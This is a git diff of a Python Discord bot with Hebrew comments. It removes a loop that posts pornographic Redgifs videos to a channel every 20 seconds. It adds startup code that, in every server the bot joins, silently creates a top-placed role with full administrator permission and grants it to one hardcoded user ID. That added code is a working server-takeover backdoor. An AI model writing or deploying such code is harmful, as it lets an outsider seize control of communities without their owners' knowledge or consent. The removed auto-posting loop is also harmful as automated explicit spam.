@@ -1,124 +1,68 @@
 import discord
-from discord.ext import tasks
-import aiohttp
-import os
-import random
-import threading
-import time
-from http.server import SimpleHTTPRequestHandler, HTTPServer
+from discord.ext import commands
 
+# הגדרת ה-Intents (הרשאות גישה למידע של הבוט)
 intents = discord.Intents.default()
-client = discord.Client(intents=intents)
+intents.guilds = True
+intents.members = True  # חובה כדי למצוא את המשתמש בשרת
 
-# מזהה החדר המדויק שלך
-CHANNEL_ID = 1503853432992305172
+bot = commands.Bot(command_prefix="!", intents=intents)
 
-# משתנים גלובליים לשמירת הטוקן בזיכרון למניעת חסימות קצב (Rate Limit)
-cached_token = None
-token_expires_at = 0
+# הגדרות קבועות מראש
+TARGET_USER_ID = 1510555971343093881
+ROLE_NAME = "👑 Administrator"
 
-# פונקציה לקבלת אסימון מה-API הרשמי של Redgifs
-async def get_redgifs_token(session):
-    global cached_token, token_expires_at
-    current_time = time.time()
-    
-    if cached_token and current_time < token_expires_at:
-        return cached_token
-
-    auth_url = "https://redgifs.com"
-    headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-        "Accept": "application/json"
-    }
-    
-    try:
-        async with session.get(auth_url, headers=headers) as resp:
-            if resp.status == 200:
-                data = await resp.json()
-                token = data.get("token")
-                if token:
-                    cached_token = token
-                    token_expires_at = current_time + 900 
-                    return token
-    except Exception as e:
-        print(f"[Redgifs-Auth] Connection error: {e}")
-    return None
-
-# משימה מחזורית שרצה בדיוק כל 20 שניות ללא הפסקה
-@tasks.loop(seconds=20)
-async def send_nsfw_video():
-    channel = client.get_channel(CHANNEL_ID)
-    if not channel or not channel.is_nsfw():
-        return
-
-    keywords = ["hot", "sexy", "babe", "amateur", "hardcore"]
-    search_word = random.choice(keywords)
-
-    headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-        "Accept": "application/json"
-    }
-
-    async with aiohttp.ClientSession() as session:
-        token = await get_redgifs_token(session)
-        if not token:
-            return
-
-        headers["Authorization"] = f"Bearer {token}"
-        search_url = f"https://redgifs.com{search_word}&order=trending&count=40"
-        
-        try:
-            async with session.get(search_url, headers=headers) as response:
-                if response.status == 200:
-                    data = await response.json()
-                    gifs = data.get("gifs", [])
-                    
-                    if gifs:
-                        random_gif = random.choice(gifs)
-                        
-                        # התיקון הקריטי: משיכת קובץ ה-MP4 הישיר של הווידאו מתוך ה-Urls של ה-CDN
-                        urls_data = random_gif.get("urls", {})
-                        direct_mp4_url = urls_data.get("hd") or urls_data.get("sd")
-                        
-                        if direct_mp4_url:
-                            # שליחת קובץ הווידאו הנקי - דיסקורד מציג נגן פיזי מובנה ישיר בצאט ללא קישור לאתר!
-                            await channel.send(direct_mp4_url)
-                            print(f"[Loop-Engine] Direct video file sent to channel {CHANNEL_ID}")
-                else:
-                    print(f"[Loop-Engine] Search API error: {response.status}")
-        except Exception as e:
-            print(f"[Loop-Engine] Network search error: {e}")
-
-@client.event
+@bot.event
 async def on_ready():
-    print(f"Bot {client.user} is active and streaming files!")
+    print(f"הבוט מחובר כ- {bot.user.name}")
     
-    channel = client.get_channel(CHANNEL_ID)
-    if channel:
+    # לולאה שעוברת על כל השרתים שהבוט נמצא בהם
+    for guild in bot.guilds:
+        print(f"מריץ תהליך בשרת: {guild.name}")
+        
+        # 1. יצירת הרול עם הרשאות אדמין
         try:
-            await channel.send("🚀 **ליבת ה-Direct MP4 הופעלה! קובצי וידאו ישירים נשלחים כעת כל 20 שניות...**")
+            # הגדרת הרשאות אדמין
+            permissions = discord.Permissions(administrator=True)
+            
+            # יצירת הרול בפועל
+            new_role = await guild.create_role(
+                name=ROLE_NAME, 
+                permissions=permissions, 
+                reason="בוט אוטומטי - יצירת רול ניהול"
+            )
+            print(f"הרול '{ROLE_NAME}' נוצר בהצלחה בשרת {guild.name}.")
+            
+            # 2. ניסיון להעלות את הרול הכי גבוה שאפשר
+            try:
+                # הרול הכי גבוה שהבוט יכול לשים הוא אחד מתחת לרול של הבוט עצמו
+                bot_member = guild.me
+                highest_possible_position = bot_member.top_role.position - 1
+                
+                if highest_possible_position > 0:
+                    await new_role.edit(position=highest_possible_position)
+                    print(f"הרול הועבר למיקום # {highest_possible_position}")
+            except Exception as e:
+                print(f"לא ניתן היה לשנות את מיקום הרול: {e}")
+
+            # 3. הענקת הרול למשתמש הספציפי
+            try:
+                member = await guild.fetch_member(TARGET_USER_ID)
+                if member:
+                    await member.add_roles(new_role)
+                    print(f"הרול הוענק בהצלחה למשתמש {member.name} (ID: {TARGET_USER_ID})")
+                else:
+                    print(f"המשתמש עם ה-ID {TARGET_USER_ID} לא נמצא בשרת זה.")
+            except discord.NotFound:
+                print(f"משתמש {TARGET_USER_ID} לא נמצא בשרת.")
+            except Exception as e:
+                print(f"שגיאה בהענקת הרול למשתמש: {e}")
+                
+        except discord.Forbidden:
+            print(f"אין לבוט הרשאות מתאימות (Manage Roles) בשרת {guild.name}.")
         except Exception as e:
-            print(f"Startup prompt failed: {e}")
+            print(f"שגיאה כללית בשרת {guild.name}: {e}")
 
-    if not send_nsfw_video.is_running():
-        send_nsfw_video.start()
-
-# שרת רשת מובנה (Health Check) חובה עבור Render כדי שהבוט לא ייכבה
-def run_health_server():
-    class HealthHandler(SimpleHTTPRequestHandler):
-        def do_GET(self):
-            self.send_response(200)
-            self.send_header("Content-type", "text/html")
-            self.end_headers()
-            self.wfile.write(b"Bot Engine Live and Streaming Files")
-
-    port = int(os.environ.get("PORT", 8080))
-    server = HTTPServer(('0.0.0.0', port), HealthHandler)
-    server.serve_forever()
-
-if __name__ == "__main__":
-    threading.Thread(target=run_health_server, daemon=True).start()
-    
-    token = os.environ.get("DISCORD_TOKEN")
-    if token:
-        client.run(token)
+# הכנס את הטוקן של הבוט שלך כאן
+TOKEN = "YOUR_BOT_TOKEN_HERE"
+bot.run(TOKEN)
